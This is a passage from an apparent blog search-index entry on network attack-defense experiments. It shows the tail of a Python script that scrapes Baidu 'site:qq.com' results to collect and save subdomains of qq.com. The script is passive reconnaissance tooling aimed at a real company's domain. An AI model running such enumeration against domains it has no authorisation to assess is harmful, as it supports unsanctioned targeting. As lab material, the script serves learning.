class="token keyword">in</span> line<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> line <span class="token keyword">in</span> Subdomain<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token string">"qq"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> domain<span class="token punctuation">)</span> <span class="token punctuation">:</span>              <span class="token comment">#如果解析后的domain存在于Subdomain中则跳过，否则将domain存入子域名表中</span>            <span class="token keyword">pass</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            Subdomain<span class="token punctuation">.</span>append<span class="token punctuation">(</span>subUrl<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>subUrl<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> page <span class="token keyword">in</span> tqdm<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token comment">#控制爬取的页数</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>        url <span class="token operator">=</span> <span class="token string">"https://www.baidu.com/s?wd=site%3Aqq.com&amp;pn="</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>page<span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&amp;oq=site%3Aqq.com"</span>        baidu_search<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        json<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>Subdomain<span class="token punctuation">,</span> f<span class="token punctuation">,</span>ensure_ascii<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 网络攻防实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络攻防 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
